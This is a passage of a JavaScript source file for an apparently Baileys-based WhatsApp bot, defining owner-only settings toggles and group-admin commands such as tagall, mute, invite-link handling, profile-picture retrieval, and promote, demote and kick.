    setGlobalSetting(sessionId, 'autoreact', arg === 'on');
    await sock.sendMessage(from, {
      text: `😄 *Auto-react* turned *${arg === 'on' ? 'ON ✅' : 'OFF ❌'}* — applies to DMs and groups.`,
    });
  },
});

register({
  name: 'anticall',
  category: 'GROUP-SECURITY',
  description: 'Auto-reject incoming calls to this bot (owner only) — on/off',
  async execute({ sock, from, args, msg, sessionId }) {
    if (!msg.key.fromMe) {
      await sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
      return;
    }
    const arg = (args[0] || '').toLowerCase();
    if (!arg || !['on', 'off'].includes(arg)) {
      await sock.sendMessage(from, {
        text: `📵 *Anticall* is currently *${getGlobalSetting(sessionId, 'anticall') ? 'ON' : 'OFF'}*.\nUse: ${PREFIX}anticall on | ${PREFIX}anticall off`,
      });
      return;
    }
    setGlobalSetting(sessionId, 'anticall', arg === 'on');
    await sock.sendMessage(from, { text: `📵 *Anticall* turned *${arg === 'on' ? 'ON ✅' : 'OFF ❌'}*.` });
  },
});

register({
  name: 'mode',
  aliases: ['private', 'public'],
  category: 'GROUP-SECURITY',
  description: 'Switch the bot between public and private mode (owner only)',
  async execute({ sock, from, args, msg, sessionId, text }) {
    if (!msg.key.fromMe) {
      await sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
      return;
    }
    // Support both ".mode private" and the bare ".private" / ".public" aliases.
    const invoked = text.slice(PREFIX.length).trim().split(/\s+/)[0].toLowerCase();
    const arg = ['private', 'public'].includes(invoked) ? invoked : (args[0] || '').toLowerCase();

    if (!arg || !['public', 'private'].includes(arg)) {
      const current = getGlobalSetting(sessionId, 'mode');
      await sock.sendMessage(from, {
        text: `⚙️ Bot is currently in *${current.toUpperCase()}* mode.\nUse: ${PREFIX}mode public | ${PREFIX}mode private`,
      });
      return;
    }

    setGlobalSetting(sessionId, 'mode', arg);
    await sock.sendMessage(from, {
      text:
        arg === 'private'
          ? '🔒 *Private mode* enabled — only the owner can use commands now.'
          : '🌐 *Public mode* enabled — everyone can use commands.',
    });
  },
});

register({
  name: 'security',
  aliases: ['groupsettings'],
  category: 'GROUP-SECURITY',
  description: 'View all group-security toggles at a glance',
  async execute({ sock, from, isGroup, sessionId }) {
    if (!isGroup) {
      await sock.sendMessage(from, { text: '⚠️ This only applies inside groups.' });
      return;
    }
    const s = getGroupSettings(from);
    const flag = (v) => (v ? '✅ ON' : '❌ OFF');
    const text =
      `🛡️ *Group Security Status*\n\n` +
      `🗑️ Antidelete        : ${flag(s.antidelete)}\n` +
      `✏️ Antiedit          : ${flag(s.antiedit)}\n` +
      `🎴 Antisticker       : ${flag(s.antisticker)}\n` +
      `🚫 Antigroupmention  : ${flag(s.antigroupmention)}\n` +
      `🔗 Antilink          : ${flag(s.antilink)}\n\n` +
      `😄 Auto-react (all chats) : ${flag(getGlobalSetting(sessionId, 'autoreact'))}\n` +
      `📵 Anticall (all chats)   : ${flag(getGlobalSetting(sessionId, 'anticall'))}\n\n` +
      `_Group toggles: ${PREFIX}<name> on/off. Auto-react/anticall are owner-only and apply everywhere._`;
    await sock.sendMessage(from, { text });
  },
});

// ---------- GROUP-ADMIN ----------

// Resolves a target JID from a mention, a quoted message's sender, or a raw
// number passed as an argument — in that order of preference.
// Strips the WhatsApp domain suffix (and any device id) from a JID, leaving
// just the raw phone number — used whenever we need to @-mention someone.
function bareNumber(jid) {
  return (jid || '').split('@')[0].split(':')[0];
}

function getTargetJid({ msg, quoted, args }) {
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
  if (mentioned && mentioned.length) return mentioned[0];
  if (quoted?.key?.participant) return quoted.key.participant;
  const num = (args[0] || '').replace(/[^0-9]/g, '');
  if (num) return `${num}@s.whatsapp.net`;
  return null;
}

function requireGroup({ sock, from, isGroup }) {
  if (!isGroup) {
    sock.sendMessage(from, { text: '⚠️ This command only works inside groups.' });
    return false;
  }
  return true;
}

register({
  name: 'tagall',
  category: 'GROUP-ADMIN',
  description: 'Mention every member in the group',
  async execute(ctx) {
    const { sock, from, isGroup, args } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;

    const meta = await sock.groupMetadata(from);
    const mentions = meta.participants.map((p) => p.id);
    const note = args.join(' ');

    let text = `📢 *Tag All* (${mentions.length} members)\n\n`;
    mentions.forEach((jid) => {
      text += `• @${bareNumber(jid)}\n`;
    });
    if (note) text += `\n💬 ${note}`;

    await sock.sendMessage(from, { text, mentions });
  },
});

register({
  name: 'hidetag',
  category: 'GROUP-ADMIN',
  description: 'Notify everyone without listing numbers — add a message or reply to one',
  async execute(ctx) {
    const { sock, from, args, quoted } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;

    const meta = await sock.groupMetadata(from);
    const mentions = meta.participants.map((p) => p.id);
    const quotedText = quoted?.message?.conversation || quoted?.message?.extendedTextMessage?.text;
    const text = args.join(' ') || quotedText || '📢';

    await sock.sendMessage(from, { text, mentions });
  },
});

register({
  name: 'mute',
  category: 'GROUP-ADMIN',
  description: 'Only admins can send messages in this group',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      await sock.groupSettingUpdate(from, 'announcement');
      await sock.sendMessage(from, { text: '🔇 Group muted — only admins can send messages now.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not mute — is the bot an admin here?' });
    }
  },
});

register({
  name: 'unmute',
  category: 'GROUP-ADMIN',
  description: 'Everyone can send messages again',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      await sock.groupSettingUpdate(from, 'not_announcement');
      await sock.sendMessage(from, { text: '🔊 Group unmuted — everyone can send messages.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not unmute — is the bot an admin here?' });
    }
  },
});

register({
  name: 'setgcname',
  category: 'GROUP-ADMIN',
  description: 'Change the group name',
  async execute(ctx) {
    const { sock, from, args } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    const name = args.join(' ');
    if (!name) {
      await sock.sendMessage(from, { text: `📝 Use: ${PREFIX}setgcname <new name>` });
      return;
    }
    try {
      await sock.groupUpdateSubject(from, name);
      await sock.sendMessage(from, { text: `✅ Group name updated to *${name}*.` });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not update the group name — is the bot an admin here?' });
    }
  },
});

register({
  name: 'setgcpic',
  category: 'GROUP-ADMIN',
  description: 'Reply to an image with this to set it as the group photo',
  async execute(ctx) {
    const { sock, from, quoted, msg } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;

    const target = quoted || msg;
    const imageMsg = target?.message?.imageMessage;
    if (!imageMsg) {
      await sock.sendMessage(from, { text: `📎 Reply to an image with *${PREFIX}setgcpic*` });
      return;
    }

    try {
      const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
      const stream = await downloadContentFromMessage(imageMsg, 'image');
      let buffer = Buffer.from([]);
      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
      await sock.updateProfilePicture(from, buffer);
      await sock.sendMessage(from, { text: '✅ Group photo updated.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not update the group photo — is the bot an admin here?' });
    }
  },
});

register({
  name: 'groupdesc',
  aliases: ['setgcdesc', 'gcdesc'],
  category: 'GROUP-ADMIN',
  description: 'Set the group description',
  async execute(ctx) {
    const { sock, from, args } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    const desc = args.join(' ');
    if (!desc) {
      await sock.sendMessage(from, { text: `📝 Use: ${PREFIX}groupdesc <new description>` });
      return;
    }
    try {
      await sock.groupUpdateDescription(from, desc);
      await sock.sendMessage(from, { text: '✅ Group description updated.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not update the description — is the bot an admin here?' });
    }
  },
});

register({
  name: 'link',
  aliases: ['invitelink', 'grouplink'],
  category: 'GROUP-ADMIN',
  description: 'Get the group invite link',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      const code = await sock.groupInviteCode(from);
      await sock.sendMessage(from, { text: `🔗 https://chat.whatsapp.com/${code}` });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not fetch the invite link — is the bot an admin here?' });
    }
  },
});

register({
  name: 'revokelink',
  aliases: ['resetlink'],
  category: 'GROUP-ADMIN',
  description: 'Reset the group invite link (invalidates the old one)',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      const code = await sock.groupRevokeInvite(from);
      await sock.sendMessage(from, { text: `🔄 Invite link reset.\n🔗 https://chat.whatsapp.com/${code}` });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not reset the invite link — is the bot an admin here?' });
    }
  },
});

register({
  name: 'lockinfo',
  category: 'GROUP-ADMIN',
  description: 'Only admins can edit group info (name, photo, description)',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      await sock.groupSettingUpdate(from, 'locked');
      await sock.sendMessage(from, { text: '🔒 Group info locked — only admins can edit name/photo/description now.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not lock group info — is the bot an admin here?' });
    }
  },
});

register({
  name: 'unlockinfo',
  category: 'GROUP-ADMIN',
  description: 'Everyone can edit group info again',
  async execute(ctx) {
    const { sock, from } = ctx;
    if (!requireGroup(ctx)) return;
    const ok = await requireAdminOrOwner(ctx);
    if (!ok) return;
    try {
      await sock.groupSettingUpdate(from, 'unlocked');
      await sock.sendMessage(from, { text: '🔓 Group info unlocked — everyone can edit name/photo/description again.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not unlock group info — is the bot an admin here?' });
    }
  },
});

register({
  name: 'getpp',
  aliases: ['pp'],
  category: 'GROUP-ADMIN',
  description: "Get someone's profile picture — reply, mention, or give a number",
  async execute(ctx) {
    const { sock, from, sender } = ctx;
    const target = getTargetJid(ctx) || sender;
    try {
      const url = await sock.profilePictureUrl(target, 'image');
      await sock.sendMessage(from, {
        image: { url },
        caption: `🖼️ Profile photo of @${bareNumber(target)}`,
        mentions: [target],
      });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not fetch a profile photo (it may be private or unset).' });
    }
  },
});

register({
  name: 'setpp',
  category: 'GROUP-ADMIN',
  description: "Reply to an image to set it as the bot's own profile picture (owner only)",
  async execute({ sock, from, quoted, msg }) {
    if (!msg.key.fromMe) {
      await sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
      return;
    }
    const target = quoted || msg;
    const imageMsg = target?.message?.imageMessage;
    if (!imageMsg) {
      await sock.sendMessage(from, { text: `📎 Reply to an image with *${PREFIX}setpp*` });
      return;
    }
    try {
      const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
      const stream = await downloadContentFromMessage(imageMsg, 'image');
      let buffer = Buffer.from([]);
      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
      await sock.updateProfilePicture(sock.user.id, buffer);
      await sock.sendMessage(from, { text: '✅ Bot profile photo updated.' });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not update the profile photo.' });
    }
  },
});

function memberActionCommand({ name, action, verb, pastTense, emoji }) {
  register({
    name,
    category: 'GROUP-ADMIN',
    description: `${verb} a member — reply, mention, or give a number`,
    async execute(ctx) {
      const { sock, from } = ctx;
      if (!requireGroup(ctx)) return;
      const ok = await requireAdminOrOwner(ctx);
      if (!ok) return;

      const target = getTargetJid(ctx);
      if (!target) {
        await sock.sendMessage(from, { text: `👤 Reply to, mention, or give a number: ${PREFIX}${name} @user` });
        return;
      }

      try {
        await sock.groupParticipantsUpdate(from, [target], action);
        await sock.sendMessage(from, {
          text: `${emoji} @${bareNumber(target)} — ${pastTense}.`,
          mentions: [target],
        });
      } catch {
        await sock.sendMessage(from, { text: `❌ Could not ${verb.toLowerCase()} — is the bot an admin here?` });
      }
    },
  });
}

memberActionCommand({ name: 'promote', action: 'promote', verb: 'Promote', pastTense: 'promoted to admin', emoji: '⬆️' });
memberActionCommand({ name: 'demote', action: 'demote', verb: 'Demote', pastTense: 'demoted to member', emoji: '⬇️' });
memberActionCommand({ name: 'kick', action: 'remove', verb: 'Kick', pastTense: 'removed from the group', emoji: '👢' });

module.exports = { commands, PREFIX, BOT_NAME, setAutoBio };
